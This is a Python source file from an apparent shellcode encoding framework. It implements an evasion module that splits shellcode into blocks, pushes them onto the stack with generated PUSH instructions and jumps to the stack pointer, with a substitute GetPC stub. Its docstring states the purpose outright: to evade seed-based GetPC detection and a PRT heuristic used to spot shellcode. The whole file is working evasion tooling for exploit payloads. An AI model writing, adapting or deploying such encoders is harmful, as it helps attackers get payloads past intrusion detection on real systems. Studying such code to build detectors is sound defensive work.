#!/usr/bin/python

"""
Anti-GetPC detection armor using stack-constructed shellcode
For evasion of seed-based GetPC detection, implemented to evade PRT heuristic as well
"""

from struct import unpack, pack
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from utils.rand import rand_bytes
from arch.core import stackpointer_registers, bit_packs

class evasion_getpc_stackconstruct(evasion_module):

	def has_layer_encoder(self):
		return True

	# Stand-in 'GetPC' code (since esp = PC when the code gets run)
	def getpc_stub(self, getpc_reg):

		reg_size = 2**self.bits
		
		stackpointer_reg = stackpointer_registers[self.bits]

		variables = {'getpc_reg': getpc_reg, 'stackpointer_reg': stackpointer_reg, 'reg_size': reg_size}

		listing = '''
main:
	MOV {getpc_reg}, {stackpointer_reg}
	SUB {getpc_reg}, (-5 % {reg_size})
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub

    #
    # Custom encoding to push (encoded) shellcode to the stack and execute from there
    #
    # [-] Limitations:
    #      - Might be incompatible with some (rare) shellcodes presuming large amount of data can be written to preceding stack (due to overwriting issues)
    #
    # [*] Note:
    #      - This can be further improved by letting caller specify desired amount of prepended stackspace
    #
	def encode(self, buf, badchars):
		# Additional stackspace to take into account initial shellcode instructions assuming some stackspace to work with (eg. FNSTENV storing record on stack)
		stackspace_count = 28
		stackspace = rand_bytes(stackspace_count, badchars)

		# Prepend stackspace to buf (which is stubs + encoded body)
		buf = stackspace + buf

		# architecture-dependent memory word sizes
		reg_size = 2**self.bits

		block_size = self.bits / 8
		packer = bit_packs[self.bits]
		stackpointer_reg = stackpointer_registers[self.bits]

		# Align buf to block_size (for subsequent conversion to stack-pushed blocks)
		if (len(buf) % block_size != 0):
			buf = buf + rand_bytes((block_size - (len(buf) % block_size)), badchars)

		# split buffer into blocks, reverse order for pushing
		blocks = [buf[i:i+block_size] for i in range(0, len(buf), block_size)][::-1]
		
		variables = {'stackpointer_reg': stackpointer_reg, 'stackspace_count': stackspace_count, 'reg_size': reg_size}

		# push to stack
		listing = "main:\n"

		for block in blocks:
			listing += "PUSH 0x{:x}\n".format(unpack(packer, block)[0])

		# Transfer control to (ESP + stackSpaceCount) after pushing is done
		listing += '''
SUB {stackpointer_reg}, (-{stackspace_count} % {reg_size})
JMP {stackpointer_reg}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))

		return stub